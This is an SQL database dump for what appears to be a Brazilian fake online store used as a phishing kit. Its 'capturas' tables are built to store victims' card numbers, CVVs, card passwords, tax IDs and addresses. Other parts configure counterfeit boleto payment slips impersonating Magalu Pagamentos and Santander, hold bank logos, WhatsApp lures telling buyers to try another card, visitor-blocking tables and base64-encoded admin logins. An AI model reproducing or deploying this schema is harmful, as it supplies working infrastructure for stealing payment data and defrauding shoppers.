-- phpMyAdmin SQL Dump
-- version 5.0.4
-- https://www.phpmyadmin.net/
--
-- Host: 10.129.76.12
-- Tempo de geração: 30/10/2021 às 16:35
-- Versão do servidor: 5.6.26-log
-- Versão do PHP: 7.1.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `bdtempp`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `analises`
--

CREATE TABLE `analises` (
  `id` int(11) NOT NULL,
  `dispositivo` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `ip` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `estado` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `pais` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `produto` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `hora` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `dia` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `etapa` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `api_whats`
--

CREATE TABLE `api_whats` (
  `id` int(11) NOT NULL,
  `status` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `token` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `instancia` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `mensagem_boleto` varchar(1000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `mensagem_cc` varchar(1000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `mensagem_repetida` varchar(1000) COLLATE utf8_unicode_ci DEFAULT NULL,
  `img` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `api_whats`
--

INSERT INTO `api_whats` (`id`, `status`, `token`, `instancia`, `mensagem_boleto`, `mensagem_cc`, `mensagem_repetida`, `img`) VALUES
(1, '2', 'null', 'null', 'Olá !nome, seu pedido n° !pedido foi feito, agora basta pagar seu boleto em qualquer agência ou internet banking, aqui está seu código para pagamento: !boleto | Valor total: R$ !valor | Vencimento: !vencimento', 'Olá !nome,  sua compra está sendo processada, aguarde a confirmação. Produto: !produto | Valor total: R$ !valor', 'Olá !nome,  Parece que você está tendo problemas com sua compra, que tal tentar com outro cartão ? ;) Produto: !produto | Valor total: R$ !valor', 'null');

-- --------------------------------------------------------

--
-- Estrutura para tabela `atack`
--

CREATE TABLE `atack` (
  `id` int(11) NOT NULL,
  `ip` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `pais` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `frase` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `dia` varchar(30) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `blacklist`
--

CREATE TABLE `blacklist` (
  `id` int(11) NOT NULL,
  `ip` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `dia` varchar(30) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `boletos`
--

CREATE TABLE `boletos` (
  `id` int(11) NOT NULL,
  `numero` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `id_produto` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `status` varchar(150) COLLATE utf8_unicode_ci NOT NULL DEFAULT '1'
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `capturas`
--

CREATE TABLE `capturas` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `nascimento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `telefone` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cpf` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `titular_cartao` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cc` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `validade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cvv` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `pass_cc` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ler` varchar(300) COLLATE utf8_unicode_ci NOT NULL DEFAULT '2',
  `metodo` varchar(300) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'null',
  `consulta` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `categoria` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `qtd` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `pais` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bandeira` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `moeda` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `foto_card` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `level_card` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `capturas_boleto`
--

CREATE TABLE `capturas_boleto` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cpf` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `telefone` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ler` varchar(300) COLLATE utf8_unicode_ci NOT NULL DEFAULT '2',
  `metodo` varchar(300) COLLATE utf8_unicode_ci NOT NULL DEFAULT 'null',
  `id_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `id_leto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `pedido` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `chaves_pix`
--

CREATE TABLE `chaves_pix` (
  `id` int(11) NOT NULL,
  `chave` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `id_produto` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `configuracao`
--

CREATE TABLE `configuracao` (
  `id` int(11) NOT NULL,
  `link_site` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `tokken` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `anti_phising` varchar(100) COLLATE utf8_unicode_ci NOT NULL,
  `alterna` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `ip_ex` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `limite_engenharia` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `exibi_preco` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `msg_final` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `msg_eng` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `msg_erro` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `msg_sucesso` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `msg_leto` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `redirect` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `face` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `visual` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `key_parceria` varchar(1500) COLLATE utf8_unicode_ci NOT NULL,
  `tempo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `slot` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `configuracao`
--

INSERT INTO `configuracao` (`id`, `link_site`, `email`, `tokken`, `anti_phising`, `alterna`, `ip_ex`, `limite_engenharia`, `exibi_preco`, `msg_final`, `msg_eng`, `msg_erro`, `msg_sucesso`, `msg_leto`, `redirect`, `face`, `visual`, `key_parceria`, `tempo`, `slot`) VALUES
(1, 'http://localhost', 'SEU EMAIL', 'k9', 'global', '1', 'n', 'limit 0,5', '1', '1', 'Aproveite nossas promoções !', 'Infelizmente o pagamento não foi aprovado pelo seu banco. Por favor, verifique se os dados digitados estão corretos e tente novamente. Se mesmo assim não conseguir efetuar o pagamento, sugerimos que escolha outra forma de pagamento ou entre em contato com seu banco através do telefone disponível no verso do cartão', 'DIGITE UMA MENSAGEM...', 'SUA MENSAGEM', '2', '0', '1', 'null', '9QsNin0juZz6mIGiT1SJLsYkSDuwVJ', '1');

-- --------------------------------------------------------

--
-- Estrutura para tabela `config_leto`
--

CREATE TABLE `config_leto` (
  `id` int(11) NOT NULL,
  `logo_topo` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `logo_banco` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `cod_banco` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `ag_cod_beneficiario` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `beneficiario` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `cnpj` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `frase_1` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `instrucoes` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `config_leto`
--

INSERT INTO `config_leto` (`id`, `logo_topo`, `logo_banco`, `cod_banco`, `ag_cod_beneficiario`, `beneficiario`, `cnpj`, `frase_1`, `instrucoes`) VALUES
(1, 'logo_topo.png', 'santa.svg', '033-7', '0154 172538-6', 'Magalu Pagamentos | Pagar.me Pagamentos S/A', '07.084.735/0001-90', 'Pagável em qualquer Agência Bancária, Internet Banking ou App de Banco até o vencimento', '1. Senhor(a) Caixa, favor não receber este documento após a data de vencimento.<br>\n2. Não receber por depósito.<br>\n3. Pagamento em cheque, anotar no verso o Nosso número. <br>');

-- --------------------------------------------------------

--
-- Estrutura para tabela `contador_2`
--

CREATE TABLE `contador_2` (
  `id` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `visitas` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `x9` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `contador_2`
--

INSERT INTO `contador_2` (`id`, `visitas`, `x9`) VALUES
('1', '0', '0');

-- --------------------------------------------------------

--
-- Estrutura para tabela `cupoms`
--

CREATE TABLE `cupoms` (
  `id` int(11) NOT NULL,
  `codigo` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `usados` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `desconto` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `estados`
--

CREATE TABLE `estados` (
  `id` int(11) NOT NULL,
  `estado` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL,
  `visitas` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `img_logo`
--

CREATE TABLE `img_logo` (
  `id` int(11) NOT NULL,
  `img` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `name` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `img_logo`
--

INSERT INTO `img_logo` (`id`, `img`, `name`) VALUES
(1, 'santa.svg', 'Santander'),
(2, 'nubank.png', 'Nubank'),
(3, 'inter.png', 'Inter'),
(4, 'caixa.png', 'Caixa'),
(5, 'bradesco.png', 'Bradesco'),
(6, 'bb.png', 'Banco do Brasil');

-- --------------------------------------------------------

--
-- Estrutura para tabela `on_mobile`
--

CREATE TABLE `on_mobile` (
  `id` int(11) NOT NULL,
  `ultima_data` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `parceria`
--

CREATE TABLE `parceria` (
  `id` int(11) NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `url` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `trafego` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `key_parceiro` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `parceria`
--

INSERT INTO `parceria` (`id`, `apelido`, `url`, `trafego`, `status`, `key_parceiro`) VALUES
(1, 'null', 'null', 'null', 'null', 'null');

-- --------------------------------------------------------

--
-- Estrutura para tabela `permissao`
--

CREATE TABLE `permissao` (
  `id` int(11) NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `data_pedido` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `data_expira` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL,
  `chave` varchar(300) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `produtos`
--

CREATE TABLE `produtos` (
  `id` int(11) NOT NULL,
  `url` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `preco` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `img1` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img2` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img3` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img4` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img5` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img6` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img7` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img8` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `img9` varchar(800) COLLATE utf8_unicode_ci NOT NULL,
  `status_boleto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `status_senha` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `voltagem` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cor` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `avaliacao` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `id_maior` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `repetidas` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `desconto_leto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `vencimento_leto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `status_pix` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `smtp`
--

CREATE TABLE `smtp` (
  `id` int(11) NOT NULL,
  `link_host` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `usuario` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `senha` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `email` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `porta` varchar(200) COLLATE utf8_unicode_ci DEFAULT NULL,
  `smtp_status` varchar(200) COLLATE utf8_unicode_ci NOT NULL,
  `assunto` varchar(200) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `smtp`
--

INSERT INTO `smtp` (`id`, `link_host`, `usuario`, `senha`, `email`, `porta`, `smtp_status`, `assunto`) VALUES
(1, 'null', 'null', 'null', 'null', 'null', '2', 'Segunda Via - Boleto');

-- --------------------------------------------------------

--
-- Estrutura para tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `login` varchar(30) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(40) COLLATE utf8_unicode_ci DEFAULT NULL,
  `rank` varchar(40) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Despejando dados para a tabela `usuarios`
--

INSERT INTO `usuarios` (`login`, `senha`, `rank`) VALUES
('QWRtaW4=', 'QWRtaW4xNzE=', '10');

-- --------------------------------------------------------

--
-- Estrutura para tabela `visitas`
--

CREATE TABLE `visitas` (
  `id` int(11) NOT NULL,
  `data_inicio` datetime DEFAULT NULL,
  `data_final` datetime DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `analises`
--
ALTER TABLE `analises`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `api_whats`
--
ALTER TABLE `api_whats`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `atack`
--
ALTER TABLE `atack`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `blacklist`
--
ALTER TABLE `blacklist`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `boletos`
--
ALTER TABLE `boletos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `capturas`
--
ALTER TABLE `capturas`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `capturas_boleto`
--
ALTER TABLE `capturas_boleto`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `chaves_pix`
--
ALTER TABLE `chaves_pix`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `configuracao`
--
ALTER TABLE `configuracao`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `config_leto`
--
ALTER TABLE `config_leto`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `contador_2`
--
ALTER TABLE `contador_2`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `cupoms`
--
ALTER TABLE `cupoms`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `estados`
--
ALTER TABLE `estados`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `img_logo`
--
ALTER TABLE `img_logo`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `on_mobile`
--
ALTER TABLE `on_mobile`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `parceria`
--
ALTER TABLE `parceria`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `permissao`
--
ALTER TABLE `permissao`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `produtos`
--
ALTER TABLE `produtos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `smtp`
--
ALTER TABLE `smtp`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`login`);

--
-- Índices de tabela `visitas`
--
ALTER TABLE `visitas`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `analises`
--
ALTER TABLE `analises`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `api_whats`
--
ALTER TABLE `api_whats`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `atack`
--
ALTER TABLE `atack`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `blacklist`
--
ALTER TABLE `blacklist`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `boletos`
--
ALTER TABLE `boletos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `capturas`
--
ALTER TABLE `capturas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `capturas_boleto`
--
ALTER TABLE `capturas_boleto`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `chaves_pix`
--
ALTER TABLE `chaves_pix`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `cupoms`
--
ALTER TABLE `cupoms`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `estados`
--
ALTER TABLE `estados`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `img_logo`
--
ALTER TABLE `img_logo`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- AUTO_INCREMENT de tabela `on_mobile`
--
ALTER TABLE `on_mobile`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `permissao`
--
ALTER TABLE `permissao`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `produtos`
--
ALTER TABLE `produtos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `smtp`
--
ALTER TABLE `smtp`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `visitas`
--
ALTER TABLE `visitas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
